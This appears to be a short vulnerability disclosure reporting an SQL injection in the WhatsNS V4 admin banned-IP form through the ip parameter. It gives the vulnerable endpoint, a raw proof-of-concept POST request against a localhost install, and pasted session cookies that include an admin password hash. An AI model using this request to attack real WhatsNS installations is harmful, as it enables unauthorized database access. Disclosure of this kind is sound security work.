# WhatSNS V4 sqlinject

Project official: [https://www.whatsns.com](https://www.whatsns.com/)

project address: <https://gitee.com/huangyouzhi/whatsns>

## $ip variable

>
>   URL:http://127.0.0.1/whatsns/index.php?admin_banned/add.html

![](https://github.com/YangSirrr/opendebug/blob/sourece/w1.png)

- POST:

```
POST /whatsns/index.php?admin_banned/add.html HTTP/1.1
Host: 127.0.0.1
Content-Length: 84
Cache-Control: max-age=0
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1/whatsns/index.php?admin_banned/add.html
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1557362955; UIA=25w5_%5D.0a%5Bea51%2C7%2F-0b54%60%2AX4%5D%5D_1%28b7d2%60%2F%2Cb2b%5C83b%2F%28a%29%2A-a66%2C%29073_%5Cc%2F306%60; bdshare_firstime=1557799980117; admin=admin; pass=96e79218965eb72c92a549dd5a330112; _qddaz=QD.hseds1.6f7ht3.jwptla86; Hm_lvt_7b43330a4da4a6f4353e553988ee8a62=1560155578; _ga=GA1.1.1218018200.1562750483; PHPSESSID=h3hd7t6ptn12padakioc0ma8t1; Hm_lvt_b60316de6009d5654de7312f772162be=1570587747,1570678141,1570858233,1571039155; CmsCode=gab; Hm_lpvt_b60316de6009d5654de7312f772162be=1571039517; whatsnssid=d8bab68b1a953728; whatsnsauth=61e6Qq7XJ%2FsTmG%2BeCWSu507H0taq%2B6l%2BZYn%2Bm7BiW8Tca69D47kPL9pe3n0VoJK9ufoUEfZH0r2xM%2BiGETq5
Connection: close

ip%5B%5D=1&ip%5B%5D=2&ip%5B%5D=3&ip%5B%5D=4&expiration=30&submit=%E6%B7%BB+%E5%8A%A0
```

verification: 

![](https://github.com/YangSirrr/opendebug/blob/sourece/w2.png)

